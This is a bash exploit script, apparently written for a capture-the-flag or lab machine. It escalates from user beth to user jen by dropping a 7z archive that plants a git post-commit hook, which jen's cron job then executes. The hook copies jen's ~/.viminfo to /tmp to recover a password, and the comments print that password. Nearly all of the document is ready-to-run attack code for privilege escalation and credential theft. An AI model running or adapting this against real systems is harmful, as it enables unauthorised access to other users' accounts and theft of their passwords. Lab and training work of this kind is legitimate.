#!/bin/bash
# beth -> jen: git post-commit hook via 7z drop.
#
# jen's per-minute cron (/home/jen/private/add.sh) extracts any 7z archive in
# her world-writable ~/public/repos/ into a git repo, then runs `git add` +
# `git commit`. An archive carrying .git/hooks/post-commit installs a hook that
# the commit then executes as jen. This payload exfiltrates jen's ~/.viminfo,
# whose vim search-string history leaks jen's password (binzpbeocnexoe).
#
# Run this AS beth on the target.
set -e

WORK=$(mktemp -d)
mkdir -p "$WORK/.git/hooks"
cat > "$WORK/.git/hooks/post-commit" <<'HOOK'
#!/bin/bash
id > /tmp/jen_proof 2>&1
cp /home/jen/.viminfo /tmp/jen_viminfo 2>/dev/null
chmod 644 /tmp/jen_proof /tmp/jen_viminfo 2>/dev/null
HOOK
chmod +x "$WORK/.git/hooks/post-commit"

( cd "$WORK" && 7za a -r /tmp/evil.7z .git >/dev/null )
cp /tmp/evil.7z /home/jen/public/repos/evil.7z

echo "[*] archive dropped; wait up to 60s for jen's cron, then:"
echo "    cat /tmp/jen_proof        # uid=1003(jen)"
echo "    grep -A2 'Search String' /tmp/jen_viminfo   # ?/binzpbeocnexoe"
